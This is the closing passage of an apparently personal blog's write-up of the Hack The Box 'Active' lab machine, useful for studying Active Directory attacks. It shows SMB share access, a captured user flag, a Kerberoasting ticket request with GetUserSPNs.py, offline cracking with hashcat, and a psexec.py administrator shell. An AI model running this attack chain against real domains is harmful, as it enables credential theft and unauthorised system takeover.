<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">──</span>(kali<span style="color:#960050;background-color:#1e0010">㉿</span>kali)<span style="color:#f92672">-</span>[<span style="color:#f92672">~</span>]
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">└─$</span> smbclient <span style="color:#f92672">//</span><span style="color:#ae81ff">10.10.10.100</span><span style="color:#f92672">/</span>Users <span style="color:#f92672">-</span>U active<span style="color:#f92672">.</span>htb<span style="color:#f92672">/</span>svc_tgs
</span></span><span style="display:flex;"><span>Password <span style="color:#66d9ef">for</span> [ACTIVE<span style="color:#f92672">.</span>HTB\svc_tgs]:
</span></span><span style="display:flex;"><span>Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands<span style="color:#f92672">.</span>
</span></span><span style="display:flex;"><span>smb: \<span style="color:#f92672">&gt;</span>
</span></span></code></pre></div><p>We got the user.txt file SMB</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>smb: \SVC_TGS\Desktop\<span style="color:#f92672">&gt;</span> get user<span style="color:#f92672">.</span>txt 
</span></span><span style="display:flex;"><span>getting file \SVC_TGS\Desktop\user<span style="color:#f92672">.</span>txt of size <span style="color:#ae81ff">34</span> <span style="color:#66d9ef">as</span> user<span style="color:#f92672">.</span>txt (<span style="color:#ae81ff">0.0</span> KiloBytes<span style="color:#f92672">/</span>sec) (average <span style="color:#ae81ff">0.0</span> KiloBytes<span style="color:#f92672">/</span>sec)
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">──</span>(kali<span style="color:#960050;background-color:#1e0010">㉿</span>kali)<span style="color:#f92672">-</span>[<span style="color:#f92672">~/</span>Desktop<span style="color:#f92672">/</span>HTB<span style="color:#f92672">/</span>Active]
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">└─$</span> cat user<span style="color:#f92672">.</span>txt         
</span></span><span style="display:flex;"><span>b869640a64f98d092251b8a0c9066800
</span></span></code></pre></div><p>We ran get user script and get admin hash.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">./</span>GetUserSPNs<span style="color:#f92672">.</span>py <span style="color:#f92672">-</span>request <span style="color:#f92672">-</span>dc<span style="color:#f92672">-</span>ip <span style="color:#ae81ff">10.10.10.100</span> active<span style="color:#f92672">.</span>htb<span style="color:#f92672">/</span>svc_tgs
</span></span></code></pre></div><p><img src="Active%20d4d590c8848a46b9b7fecc86ca03280f/Untitled%201.png" alt="Untitled"></p>
<p>We will copy that hash to our dirrectlty and crack it will hashcat</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>sudo hashcat <span style="color:#f92672">-</span>m <span style="color:#ae81ff">13100</span> hash<span style="color:#f92672">.</span>txt <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>share<span style="color:#f92672">/</span>wordlists<span style="color:#f92672">/</span>rockyou<span style="color:#f92672">.</span>txt
</span></span></code></pre></div><p>With the password cracked, I was able to use <a href="http://psexec.py/">psexec.py</a> to connect to the machine as the Administrator and capture the final flag.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>psexec<span style="color:#f92672">.</span>py active<span style="color:#f92672">.</span>htb<span style="color:#f92672">/</span>administrator<span style="color:#f92672">@</span><span style="color:#ae81ff">10.129.193.5</span>
</span></span><span style="display:flex;"><span>Impacket v0<span style="color:#ae81ff">.10.0</span> <span style="color:#f92672">-</span> Copyright <span style="color:#ae81ff">2022</span> SecureAuth Corporation
</span></span><span style="display:flex;"><span>Password:
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] Requesting shares on <span style="color:#ae81ff">10.129.193.5</span><span style="color:#f92672">.....</span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] Found writable share ADMIN<span style="color:#960050;background-color:#1e0010">$</span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] Uploading file utdeQdHw<span style="color:#f92672">.</span>exe
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] Opening SVCManager on <span style="color:#ae81ff">10.129.193.5</span><span style="color:#f92672">.....</span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] Creating service QIAd on <span style="color:#ae81ff">10.129.193.5</span><span style="color:#f92672">.....</span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] Starting service QIAd<span style="color:#f92672">.....</span>
</span></span><span style="display:flex;"><span>[<span style="color:#960050;background-color:#1e0010">!</span>] Press help <span style="color:#66d9ef">for</span> extra shell commands
</span></span><span style="display:flex;"><span>Microsoft Windows [Version <span style="color:#ae81ff">6.1.7601</span>]
</span></span><span style="display:flex;"><span>Copyright (c) <span style="color:#ae81ff">2009</span> Microsoft Corporation<span style="color:#f92672">.</span>  All rights reserved<span style="color:#f92672">.</span>
</span></span><span style="display:flex;"><span>C:\Windows\system32<span style="color:#f92672">&gt;</span> type C:\Users\Administrator\Desktop\root<span style="color:#f92672">.</span>txt
</span></span></code></pre></div><h2 id="resources">Resources</h2>
<p><a href="https://medium.com/@joemcfarland/hack-the-box-active-writeup-a37a1c170cf6">Hack The Box Active Writeup</a></p>
<p><a href="https://www.notion.so/AD-Kerberoasting-e4b485bf9a10426faefd53ab2eed5129?pvs=21">AD <strong>Kerberoasting</strong></a> for knowing the concept</p>

    </div>
</div>

            </main>
        </div>


        <footer class="footer">
    
        <span>
            © 2024 , Built with
            <a href="https://gohugo.io" class="footerLink">Hugo</a> and
            <a href="https://github.com/LordMathis/hugo-theme-nightfall" class="footerLink">Nightfall</a> theme
        </span>
    
</footer>
    </div>

</body>

</html>